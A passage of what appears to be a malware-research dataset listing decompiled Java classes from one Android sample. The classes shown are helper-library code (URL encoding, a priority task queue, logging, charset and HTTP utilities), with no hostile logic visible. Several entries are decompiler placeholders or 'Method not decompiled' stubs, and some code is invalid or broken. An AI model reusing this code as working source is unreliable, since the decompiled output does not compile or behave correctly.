CharArrayBuffer(str.length());     charArrayBuffer.append(str);     ParserCursor parserCursor=new ParserCursor(0,charArrayBuffer.length());     ArrayList arrayList=new ArrayList();     while (!parserCursor.atEnd()) {       NameValuePair parseNameValuePair=basicHeaderValueParser.parseNameValuePair(charArrayBuffer,parserCursor,DELIM);       if (parseNameValuePair.getName().length() > 0) {         arrayList.add(new BasicNameValuePair(parseNameValuePair.getName(),parseNameValuePair.getValue()));       }     }     return arrayList;   }   public static List<NameValuePair> parse(  URI uri){     String rawQuery=uri.getRawQuery();     if (TextUtils.isEmpty(rawQuery)) {       return Collections.emptyList();     }     ArrayList arrayList=new ArrayList();     parse(arrayList,new Scanner(rawQuery));     return arrayList;   }   public static void parse(  List<NameValuePair> list,  Scanner scanner){     String trim;     scanner.useDelimiter(PARAMETER_SEPARATOR);     while (scanner.hasNext()) {       String str=null;       String next=scanner.next();       int indexOf=next.indexOf(NAME_VALUE_SEPARATOR);       if (indexOf != -1) {         trim=next.substring(0,indexOf).trim();         str=next.substring(indexOf + 1).trim();       }  else {         trim=next.trim();       }       list.add(new BasicNameValuePair(trim,str));     }   }   private static String urldecode(  String str,  Charset charset,  boolean z){     if (str == null) {       return null;     }     ByteBuffer allocate=ByteBuffer.allocate(str.length());     CharBuffer wrap=CharBuffer.wrap(str);     while (wrap.hasRemaining()) {       char c=wrap.get();       if (c == '%' && wrap.remaining() >= 2) {         char c2=wrap.get();         char c3=wrap.get();         int digit=Character.digit(c2,16);         int digit2=Character.digit(c3,16);         if (digit == -1 || digit2 == -1) {           allocate.put((byte)37);           allocate.put((byte)c2);           allocate.put((byte)c3);         }  else {           allocate.put((byte)((digit << 4) + digit2));         }       }  else       if (z && c == '+') {         allocate.put((byte)32);       }  else {         allocate.put((byte)c);       }     }     allocate.flip();     return charset.decode(allocate).toString();   }   private static String urlencode(  String str,  Charset charset,  BitSet bitSet,  boolean z){     if (str == null) {       return null;     }     StringBuilder sb=new StringBuilder();     ByteBuffer encode=charset.encode(str);     while (encode.hasRemaining()) {       int i=encode.get() & 255;       if (bitSet.get(i)) {         sb.append((char)i);       }  else       if (z && i == 32) {         sb.append('+');       }  else {         sb.append(""%"");         char upperCase=Character.toUpperCase(Character.forDigit((i >> 4) & 15,16));         char upperCase2=Character.toUpperCase(Character.forDigit(i & 15,16));         sb.append(upperCase);         sb.append(upperCase2);       }     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\AsyncTaskResult.code","public class AsyncTaskResult<Data> {   final Data[] mData;   final PriorityAsyncTask mTask;   AsyncTaskResult(  PriorityAsyncTask priorityAsyncTask,  Data... dataArr){     this.mTask=priorityAsyncTask;     this.mData=dataArr;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\InternalHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6a993104"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\Itr.code","class Itr implements Iterator<E> {   private Node<E> current;   private E currentElement;   private Node<E> lastRet;   Itr(){     PriorityObjectBlockingQueue.this.fullyLock();     try {       this.current=PriorityObjectBlockingQueue.this.head.next;       if (this.current != null) {         this.currentElement=this.current.getValue();       }     }   finally {       PriorityObjectBlockingQueue.this.fullyUnlock();     }   }   private Node<E> nextNode(  Node<E> node){     while (true) {       Node<E> node2=node.next;       if (node2 == node) {         return PriorityObjectBlockingQueue.this.head.next;       }       if (node2 == null || node2.getValue() != null) {         return node2;       }       node=node2;     }   }   @Override public boolean hasNext(){     return this.current != null;   }   @Override public E next(){     PriorityObjectBlockingQueue.this.fullyLock();     try {       if (this.current == null) {         throw new NoSuchElementException();       }       E e=this.currentElement;       this.lastRet=this.current;       this.current=nextNode(this.current);       this.currentElement=this.current == null ? null : this.current.getValue();       return e;     }   finally {       PriorityObjectBlockingQueue.this.fullyUnlock();     }   }   @Override public void remove(){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.task.PriorityObjectBlockingQueue.Itr.remove():void"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\Node.code","class Node<T> {   Node<T> next;   private PriorityObject<?> value;   private boolean valueAsT=false;   public Node(  T t){     setValue(t);   }   public Priority getPriority(){     return this.value.priority;   }   public T getValue(){     if (this.value == null) {       return null;     }     return this.valueAsT ? (T)this.value : (T)this.value.obj;   }   public void setValue(  T t){     if (t == 0) {       this.value=null;     }  else     if (!(t instanceof PriorityObject)) {       this.value=new PriorityObject<>(Priority.DEFAULT,t);     }  else {       this.value=(PriorityObject)t;       this.valueAsT=true;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\PriorityAsyncTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3640030a"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\PriorityExecutor.code","public class PriorityExecutor implements Executor {   private static final int CORE_POOL_SIZE=5;   private static final int KEEP_ALIVE=1;   private static final int MAXIMUM_POOL_SIZE=256;   private static final ThreadFactory sThreadFactory=new ThreadFactory(){     private final AtomicInteger mCount=new AtomicInteger(1);     @Override public Thread newThread(    Runnable runnable){       return new Thread(runnable,""PriorityExecutor #"" + this.mCount.getAndIncrement());     }   } ;   private final BlockingQueue<Runnable> mPoolWorkQueue;   private final ThreadPoolExecutor mThreadPoolExecutor;   public PriorityExecutor(){     this(5);   }   public PriorityExecutor(  int i){     this.mPoolWorkQueue=new PriorityObjectBlockingQueue();     this.mThreadPoolExecutor=new ThreadPoolExecutor(i,256,1L,TimeUnit.SECONDS,this.mPoolWorkQueue,sThreadFactory);   }   @Override public void execute(  Runnable runnable){     this.mThreadPoolExecutor.execute(runnable);   }   public int getPoolSize(){     return this.mThreadPoolExecutor.getCorePoolSize();   }   public boolean isBusy(){     return this.mThreadPoolExecutor.getActiveCount() >= this.mThreadPoolExecutor.getCorePoolSize();   }   public void setPoolSize(  int i){     if (i > 0) {       this.mThreadPoolExecutor.setCorePoolSize(i);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\PriorityObject.code","public class PriorityObject<E> {   public final E obj;   public final Priority priority;   public PriorityObject(  Priority priority,  E e){     this.priority=priority == null ? Priority.DEFAULT : priority;     this.obj=e;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\PriorityObjectBlockingQueue.code","public class PriorityObjectBlockingQueue<E> extends AbstractQueue<E> implements Serializable, BlockingQueue<E> {   private static final long serialVersionUID=-6903933977591709194L;   private final int capacity;   private final AtomicInteger count;   transient Node<E> head;   private transient Node<E> last;   private final Condition notEmpty;   private final Condition notFull;   private final ReentrantLock putLock;   private final ReentrantLock takeLock; class Itr implements Iterator<E> {     private Node<E> current;     private E currentElement;     private Node<E> lastRet;     Itr(){       PriorityObjectBlockingQueue.this.fullyLock();       try {         this.current=PriorityObjectBlockingQueue.this.head.next;         if (this.current != null) {           this.currentElement=this.current.getValue();         }       }   finally {         PriorityObjectBlockingQueue.this.fullyUnlock();       }     }     private Node<E> nextNode(    Node<E> node){       while (true) {         Node<E> node2=node.next;         if (node2 == node) {           return PriorityObjectBlockingQueue.this.head.next;         }         if (node2 == null || node2.getValue() != null) {           return node2;         }         node=node2;       }     }     @Override public boolean hasNext(){       return this.current != null;     }     @Override public E next(){       PriorityObjectBlockingQueue.this.fullyLock();       try {         if (this.current == null) {           throw new NoSuchElementException();         }         E e=this.currentElement;         this.lastRet=this.current;         this.current=nextNode(this.current);         this.currentElement=this.current == null ? null : this.current.getValue();         return e;       }   finally {         PriorityObjectBlockingQueue.this.fullyUnlock();       }     }     @Override public void remove(){       throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.task.PriorityObjectBlockingQueue.Itr.remove():void"");     }   }   public PriorityObjectBlockingQueue(){     this(Integer.MAX_VALUE);   }   public PriorityObjectBlockingQueue(  int i){     this.count=new AtomicInteger();     this.takeLock=new ReentrantLock();     this.notEmpty=this.takeLock.newCondition();     this.putLock=new ReentrantLock();     this.notFull=this.putLock.newCondition();     if (i <= 0) {       throw new IllegalArgumentException();     }     this.capacity=i;     Node<E> node=new Node<>(null);     this.head=node;     this.last=node;   }   public PriorityObjectBlockingQueue(  Collection<? extends E> collection){     this(Integer.MAX_VALUE);     ReentrantLock reentrantLock=this.putLock;     reentrantLock.lock();     int i=0;     try {       for (      E e : collection) {         if (e == null) {           throw new NullPointerException();         }         if (i == this.capacity) {           throw new IllegalStateException(""Queue full"");         }         opQueue(new Node<>(e));         i++;       }       this.count.set(i);     }   finally {       reentrantLock.unlock();     }   }   private E _dequeue(){     Node<E> node=this.head;     Node<E> node2=(Node<E>)node.next;     node.next=node;     this.head=node2;     E value=node2.getValue();     node2.setValue(null);     return value;   }   private void _enqueue(  Node<E> node){     boolean z;     Node node2=this.head;     while (true) {       if (node2.next == null) {         z=false;         break;       }       Node<T> node3=node2.next;       if (node3.getPriority().ordinal() > node.getPriority().ordinal()) {         node2.next=node;         node.next=node3;         z=true;         break;       }       node2=node2.next;     }     if (z) {       return;     }     this.last.next=node;     this.last=node;   }   private synchronized E opQueue(  Node<E> node){     E e;     if (node == null) {       e=_dequeue();     }  else {       _enqueue(node);       e=null;     }     return e;   }   private void readObject(  ObjectInputStream objectInputStream){     objectInputStream.defaultReadObject();     this.count.set(0);     Node<E> node=new Node<>(null);     this.head=node;     this.last=node;     while (true) {       Object readObject=objectInputStream.readObject();       if (readObject == null) {         return;       }  else {         add(readObject);       }     }   }   private void signalNotEmpty(){     ReentrantLock reentrantLock=this.takeLock;     reentrantLock.lock();     try {       this.notEmpty.signal();     }   finally {       reentrantLock.unlock();     }   }   private void signalNotFull(){     ReentrantLock reentrantLock=this.putLock;     reentrantLock.lock();     try {       this.notFull.signal();     }   finally {       reentrantLock.unlock();     }   }   private void writeObject(  ObjectOutputStream objectOutputStream){     fullyLock();     try {       objectOutputStream.defaultWriteObject();       for (Node node=this.head.next; node != null; node=node.next) {         objectOutputStream.writeObject(node.getValue());       }       objectOutputStream.writeObject(null);     }   finally {       fullyUnlock();     }   }   @Override public void clear(){     fullyLock();     try {       r0=this.head;       while (true) {         Node node=r0.next;         if (node == null) {           break;         }         r0.next=r0;         node.setValue(null);         r0=(Node<E>)node;       }       this.head=this.last;       if (this.count.getAndSet(0) == this.capacity) {         this.notFull.signal();       }     }   finally {       fullyUnlock();     }   }   @Override public boolean contains(  Object obj){     if (obj == null) {       return false;     }     fullyLock();     try {       for (Node node=this.head.next; node != null; node=node.next) {         if (obj.equals(node.getValue())) {           return true;         }       }       return false;     }   finally {       fullyUnlock();     }   }   @Override public int drainTo(  Collection<? super E> collection){     return drainTo(collection,Integer.MAX_VALUE);   }   @Override public int drainTo(  java.util.Collection<? super E> r10,  int r11){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.task.PriorityObjectBlockingQueue.drainTo(java.util.Collection, int):int"");   }   void fullyLock(){     this.putLock.lock();     this.takeLock.lock();   }   void fullyUnlock(){     this.takeLock.unlock();     this.putLock.unlock();   }   @Override public Iterator<E> iterator(){     return new Itr();   }   @Override public boolean offer(  E e){     if (e == null) {       throw new NullPointerException();     }     AtomicInteger atomicInteger=this.count;     if (atomicInteger.get() == this.capacity) {       return false;     }     int i=-1;     Node<E> node=new Node<>(e);     ReentrantLock reentrantLock=this.putLock;     reentrantLock.lock();     try {       if (atomicInteger.get() < this.capacity) {         opQueue(node);         i=atomicInteger.getAndIncrement();         if (i + 1 < this.capacity) {           this.notFull.signal();         }       }       if (i == 0) {         signalNotEmpty();       }       return i >= 0;     }   finally {       reentrantLock.unlock();     }   }   @Override public boolean offer(  E e,  long j,  TimeUnit timeUnit){     if (e == null) {       throw new NullPointerException();     }     long nanos=timeUnit.toNanos(j);     ReentrantLock reentrantLock=this.putLock;     AtomicInteger atomicInteger=this.count;     reentrantLock.lockInterruptibly();     while (atomicInteger.get() == this.capacity) {       try {         if (nanos <= 0) {           return false;         }         nanos=this.notFull.awaitNanos(nanos);       }   finally {         reentrantLock.unlock();       }     }     opQueue(new Node<>(e));     int andIncrement=atomicInteger.getAndIncrement();     if (andIncrement + 1 < this.capacity) {       this.notFull.signal();     }     if (andIncrement == 0) {       signalNotEmpty();     }     return true;   }   @Override public E peek(){     E e=null;     if (this.count.get() != 0) {       ReentrantLock reentrantLock=this.takeLock;       reentrantLock.lock();       try {         Node<E> node=this.head.next;         if (node != null) {           e=node.getValue();         }       }   finally {         reentrantLock.unlock();       }     }     return e;   }   @Override public E poll(){     E e=null;     AtomicInteger atomicInteger=this.count;     if (atomicInteger.get() != 0) {       int i=-1;       ReentrantLock reentrantLock=this.takeLock;       reentrantLock.lock();       try {         if (atomicInteger.get() > 0) {           e=opQueue(null);           i=atomicInteger.getAndDecrement();           if (i > 1) {             this.notEmpty.signal();           }         }         reentrantLock.unlock();         if (i == this.capacity) {           signalNotFull();         }       }  catch (      Throwable th) {         reentrantLock.unlock();         throw th;       }     }     return e;   }   @Override public E poll(  long r8,  java.util.concurrent.TimeUnit r10){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.task.PriorityObjectBlockingQueue.poll(long, java.util.concurrent.TimeUnit):java.lang.Object"");   }   @Override public void put(  E e){     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     ReentrantLock reentrantLock=this.putLock;     AtomicInteger atomicInteger=this.count;     reentrantLock.lockInterruptibly();     while (atomicInteger.get() == this.capacity) {       try {         this.notFull.await();       }   finally {         reentrantLock.unlock();       }     }     opQueue(node);     int andIncrement=atomicInteger.getAndIncrement();     if (andIncrement + 1 < this.capacity) {       this.notFull.signal();     }     if (andIncrement == 0) {       signalNotEmpty();     }   }   @Override public int remainingCapacity(){     return this.capacity - this.count.get();   }   @Override public boolean remove(  Object obj){     if (obj == null) {       return false;     }     fullyLock();     try {       Node<E> node=this.head;       for (Node<E> node2=node.next; node2 != null; node2=node2.next) {         if (obj.equals(node2.getValue())) {           unlink(node2,node);           return true;         }         node=node2;       }       return false;     }   finally {       fullyUnlock();     }   }   @Override public int size(){     return this.count.get();   }   @Override public E take(){     AtomicInteger atomicInteger=this.count;     ReentrantLock reentrantLock=this.takeLock;     reentrantLock.lockInterruptibly();     while (atomicInteger.get() == 0) {       try {         this.notEmpty.await();       }  catch (      Throwable th) {         reentrantLock.unlock();         throw th;       }     }     E opQueue=opQueue(null);     int andDecrement=atomicInteger.getAndDecrement();     if (andDecrement > 1) {       this.notEmpty.signal();     }     reentrantLock.unlock();     if (andDecrement == this.capacity) {       signalNotFull();     }     return opQueue;   }   @Override public Object[] toArray(){     fullyLock();     try {       Object[] objArr=new Object[this.count.get()];       int i=0;       Node node=this.head.next;       while (node != null) {         int i2=i + 1;         objArr[i]=node.getValue();         node=node.next;         i=i2;       }       return objArr;     }   finally {       fullyUnlock();     }   }   @Override public <T>T[] toArray(  T[] tArr){     fullyLock();     try {       int i=this.count.get();       if (tArr.length < i) {         tArr=(Object[])Array.newInstance(tArr.getClass().getComponentType(),i);       }       int i2=0;       Node node=this.head.next;       while (node != null) {         tArr[i2]=node.getValue();         node=node.next;         i2++;       }       if (tArr.length > i2) {         tArr[i2]=0;       }       return tArr;     }   finally {       fullyUnlock();     }   }   void unlink(  Node<E> node,  Node<E> node2){     node.setValue(null);     node2.next=node.next;     if (this.last == node) {       this.last=node2;     }     if (this.count.getAndDecrement() == this.capacity) {       this.notFull.signal();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\PriorityRunnable.code","public class PriorityRunnable extends PriorityObject<Runnable> implements Runnable {   public PriorityRunnable(  Priority priority,  Runnable runnable){     super(priority,runnable);   }   @Override public void run(){     ((Runnable)this.obj).run();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\TaskHandler.code","public interface TaskHandler {   void cancel();   boolean isCancelled();   boolean isPaused();   void pause();   void resume();   boolean supportCancel();   boolean supportPause();   boolean supportResume(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.task\WorkerRunnable.code","public abstract class WorkerRunnable<Params,Result> implements Callable<Result> {   Params[] mParams;   private WorkerRunnable(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\CharsetUtils.code","public class CharsetUtils {   public static final String DEFAULT_ENCODING_CHARSET=""ISO-8859-1"";   public static final List<String> SUPPORT_CHARSET=new ArrayList(); static {     SUPPORT_CHARSET.add(DEFAULT_ENCODING_CHARSET);     SUPPORT_CHARSET.add(""GB2312"");     SUPPORT_CHARSET.add(""GBK"");     SUPPORT_CHARSET.add(""GB18030"");     SUPPORT_CHARSET.add(""US-ASCII"");     SUPPORT_CHARSET.add(""ASCII"");     SUPPORT_CHARSET.add(""ISO-2022-KR"");     SUPPORT_CHARSET.add(""ISO-8859-2"");     SUPPORT_CHARSET.add(""ISO-2022-JP"");     SUPPORT_CHARSET.add(""ISO-2022-JP-2"");     SUPPORT_CHARSET.add(AsyncHttpResponseHandler.DEFAULT_CHARSET);   }   private CharsetUtils(){   }   public static String getEncoding(  String str,  int i){     for (    String str2 : SUPPORT_CHARSET) {       if (isCharset(str,str2,i)) {         return str2;       }     }     return DEFAULT_ENCODING_CHARSET;   }   public static boolean isCharset(  String str,  String str2,  int i){     try {       if (str.length() > i) {         str=str.substring(0,i);       }       return str.equals(new String(str.getBytes(str2),str2));     }  catch (    Throwable th) {       return false;     }   }   public static String toCharset(  String str,  String str2,  int i){     try {       return new String(str.getBytes(getEncoding(str,i)),str2);     }  catch (    Throwable th) {       LogUtils.w(th);       return str;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\CustomLogger.code","public interface CustomLogger {   void d(  String str,  String str2);   void d(  String str,  String str2,  Throwable th);   void e(  String str,  String str2);   void e(  String str,  String str2,  Throwable th);   void i(  String str,  String str2);   void i(  String str,  String str2,  Throwable th);   void v(  String str,  String str2);   void v(  String str,  String str2,  Throwable th);   void w(  String str,  String str2);   void w(  String str,  String str2,  Throwable th);   void w(  String str,  Throwable th);   void wtf(  String str,  String str2);   void wtf(  String str,  String str2,  Throwable th);   void wtf(  String str,  Throwable th); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\DoubleKeyValueMap.code","public class DoubleKeyValueMap<K1,K2,V> {   private ConcurrentHashMap<K1,ConcurrentHashMap<K2,V>> k1_k2V_map=new ConcurrentHashMap<>();   public void clear(){     if (this.k1_k2V_map.size() > 0) {       Iterator<ConcurrentHashMap<K2,V>> it=this.k1_k2V_map.values().iterator();       while (it.hasNext()) {         it.next().clear();       }       this.k1_k2V_map.clear();     }   }   public boolean containsKey(  K1 k1){     return this.k1_k2V_map.containsKey(k1);   }   public boolean containsKey(  K1 k1,  K2 k2){     if (this.k1_k2V_map.containsKey(k1)) {       return this.k1_k2V_map.get(k1).containsKey(k2);     }     return false;   }   public V get(  K1 k1,  K2 k2){     ConcurrentHashMap<K2,V> concurrentHashMap=this.k1_k2V_map.get(k1);     if (concurrentHashMap == null) {       return null;     }     return concurrentHashMap.get(k2);   }   public ConcurrentHashMap<K2,V> get(  K1 k1){     return this.k1_k2V_map.get(k1);   }   public Collection<V> getAllValues(){     Set<K1> keySet=this.k1_k2V_map.keySet();     if (keySet == null) {       return null;     }     ArrayList arrayList=new ArrayList();     Iterator<K1> it=keySet.iterator();     while (it.hasNext()) {       Collection<V> values=this.k1_k2V_map.get(it.next()).values();       if (values != null) {         arrayList.addAll(values);       }     }     return arrayList;   }   public Collection<V> getAllValues(  K1 k1){     ConcurrentHashMap<K2,V> concurrentHashMap=this.k1_k2V_map.get(k1);     if (concurrentHashMap == null) {       return null;     }     return concurrentHashMap.values();   }   public Set<K1> getFirstKeys(){     return this.k1_k2V_map.keySet();   }   public void put(  K1 k1,  K2 k2,  V v){     if (k1 == null || k2 == null || v == null) {       return;     }     if (!this.k1_k2V_map.containsKey(k1)) {       ConcurrentHashMap<K2,V> concurrentHashMap=new ConcurrentHashMap<>();       concurrentHashMap.put(k2,v);       this.k1_k2V_map.put(k1,concurrentHashMap);       return;     }     ConcurrentHashMap<K2,V> concurrentHashMap2=this.k1_k2V_map.get(k1);     if (concurrentHashMap2 != null) {       concurrentHashMap2.put(k2,v);       return;     }     ConcurrentHashMap<K2,V> concurrentHashMap3=new ConcurrentHashMap<>();     concurrentHashMap3.put(k2,v);     this.k1_k2V_map.put(k1,concurrentHashMap3);   }   public void remove(  K1 k1){     this.k1_k2V_map.remove(k1);   }   public void remove(  K1 k1,  K2 k2){     ConcurrentHashMap<K2,V> concurrentHashMap=this.k1_k2V_map.get(k1);     if (concurrentHashMap != null) {       concurrentHashMap.remove(k2);     }   }   public int size(){     int i=0;     if (this.k1_k2V_map.size() == 0) {       return 0;     }     Iterator<ConcurrentHashMap<K2,V>> it=this.k1_k2V_map.values().iterator();     while (true) {       int i2=i;       if (!it.hasNext()) {         return i2;       }       i=it.next().size() + i2;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\IOUtils.code","public class IOUtils {   private IOUtils(){   }   public static void closeQuietly(  Cursor cursor){     if (cursor != null) {       try {         cursor.close();       }  catch (      Throwable th) {       }     }   }   public static void closeQuietly(  Closeable closeable){     if (closeable != null) {       try {         closeable.close();       }  catch (      Throwable th) {       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\LogUtils.code","public class LogUtils {   public static CustomLogger customLogger;   public static String customTagPrefix="""";   public static boolean allowD=true;   public static boolean allowE=true;   public static boolean allowI=true;   public static boolean allowV=true;   public static boolean allowW=true;   public static boolean allowWtf=true; public interface CustomLogger {     void d(    String str,    String str2);     void d(    String str,    String str2,    Throwable th);     void e(    String str,    String str2);     void e(    String str,    String str2,    Throwable th);     void i(    String str,    String str2);     void i(    String str,    String str2,    Throwable th);     void v(    String str,    String str2);     void v(    String str,    String str2,    Throwable th);     void w(    String str,    String str2);     void w(    String str,    String str2,    Throwable th);     void w(    String str,    Throwable th);     void wtf(    String str,    String str2);     void wtf(    String str,    String str2,    Throwable th);     void wtf(    String str,    Throwable th);   }   private LogUtils(){   }   public static void d(  String str){     if (allowD) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.d(generateTag,str);       }  else {         Log.d(generateTag,str);       }     }   }   public static void d(  String str,  Throwable th){     if (allowD) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.d(generateTag,str,th);       }  else {         Log.d(generateTag,str,th);       }     }   }   public static void e(  String str){     if (allowE) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.e(generateTag,str);       }  else {         Log.e(generateTag,str);       }     }   }   public static void e(  String str,  Throwable th){     if (allowE) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.e(generateTag,str,th);       }  else {         Log.e(generateTag,str,th);       }     }   }   private static String generateTag(  StackTraceElement stackTraceElement){     String className=stackTraceElement.getClassName();     String format=String.format(""%s.%s(L:%d)"",className.substring(className.lastIndexOf(""."") + 1),stackTraceElement.getMethodName(),Integer.valueOf(stackTraceElement.getLineNumber()));     return TextUtils.isEmpty(customTagPrefix) ? format : customTagPrefix + "":"" + format;   }   public static void i(  String str){     if (allowI) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.i(generateTag,str);       }  else {         Log.i(generateTag,str);       }     }   }   public static void i(  String str,  Throwable th){     if (allowI) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.i(generateTag,str,th);       }  else {         Log.i(generateTag,str,th);       }     }   }   public static void v(  String str){     if (allowV) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.v(generateTag,str);       }  else {         Log.v(generateTag,str);       }     }   }   public static void v(  String str,  Throwable th){     if (allowV) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.v(generateTag,str,th);       }  else {         Log.v(generateTag,str,th);       }     }   }   public static void w(  String str){     if (allowW) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.w(generateTag,str);       }  else {         Log.w(generateTag,str);       }     }   }   public static void w(  String str,  Throwable th){     if (allowW) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.w(generateTag,str,th);       }  else {         Log.w(generateTag,str,th);       }     }   }   public static void w(  Throwable th){     if (allowW) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.w(generateTag,th);       }  else {         Log.w(generateTag,th);       }     }   }   public static void wtf(  String str){     if (allowWtf) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.wtf(generateTag,str);       }  else {         Log.wtf(generateTag,str);       }     }   }   public static void wtf(  String str,  Throwable th){     if (allowWtf) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.wtf(generateTag,str,th);       }  else {         Log.wtf(generateTag,str,th);       }     }   }   public static void wtf(  Throwable th){     if (allowWtf) {       String generateTag=generateTag(OtherUtils.getCallerStackTraceElement());       if (customLogger != null) {         customLogger.wtf(generateTag,th);       }  else {         Log.wtf(generateTag,th);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\MimeTypeUtils.code","public class MimeTypeUtils {   private MimeTypeUtils(){   }   public static String getMimeType(  String str){     int lastIndexOf=str.lastIndexOf(""."");     if (lastIndexOf == -1) {       return RequestParams.APPLICATION_OCTET_STREAM;     }     return MimeTypeMap.getSingleton().getMimeTypeFromExtension(str.substring(lastIndexOf + 1));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.util\OtherUtils.code","public class OtherUtils {   private static final int STRING_BUFFER_LENGTH=100;   private static SSLSocketFactory sslSocketFactory;   private OtherUtils(){   }   public static long getAvailableSpace(  File file){     try {       StatFs statFs=new StatFs(file.getPath());       return statFs.getBlockSize() * statFs.getAvailableBlocks();     }  catch (    Throwable th) {       LogUtils.e(th.getMessage(),th);       return -1L;     }   }   public static StackTraceElement getCallerStackTraceElement(){     return Thread.currentThread().getStackTrace()[4];   }   public static Charset getCharsetFromHttpRequest(  HttpRequestBase httpRequestBase){     String str;     boolean z=false;     if (httpRequestBase == null) {       return null;     }     Header firstHeader=httpRequestBase.getFirstHeader(""Content-Type"");     if (firstHeader != null) {       HeaderElement[] elements=firstHeader.getElements();       for (      HeaderElement headerElement : elements) {         NameValuePair parameterByName=headerElement.getParameterByName(""charset"");         if (parameterByName != null) {           str=parameterByName.getValue();           break;         }       }     }     str=null;     if (!TextUtils.isEmpty(str)) {       try {         z=Charset.isSupported(str);       }  catch (      Throwable th) {       }     }     if (z) {       return Charset.forName(str);     }     return null;   }   public static StackTraceElement getCurrentStackTraceElement(){     return Thread.currentThread().getStackTrace()[3];   }   public static String getDiskCacheDir(  Context context,  String str){     File cacheDir;     File externalCacheDir;     String str2=null;     if (""mounted"".equals(Environment.getExternalStorageState()) && (externalCacheDir=context.getExternalCacheDir()) != null) {       str2=externalCacheDir.getPath();     }     if (str2 == null && (cacheDir=context.getCacheDir()) != null && cacheDir.exists()) {       str2=cacheDir.getPath();     }     return str2 + File.separator + str;   }   public static String getFileNameFromHttpResponse(  HttpResponse httpResponse){     Header firstHeader;     if (httpResponse == null || (firstHeader=httpResponse.getFirstHeader(""Content-Disposition"")) == null) {       return null;     }     HeaderElement[] elements=firstHeader.getElements();     for (    HeaderElement headerElement : elements) {       NameValuePair parameterByName=headerElement.getParameterByName(""filename"");       if (parameterByName != null) {         String value=parameterByName.getValue();         return CharsetUtils.toCharset(value,AsyncHttpResponseHandler.DEFAULT_CHARSET,value.length());       }     }     return null;   }   public static String getSubString(  String str,  int i,  int i2){     return new String(str.substring(i,i2));   }   public static 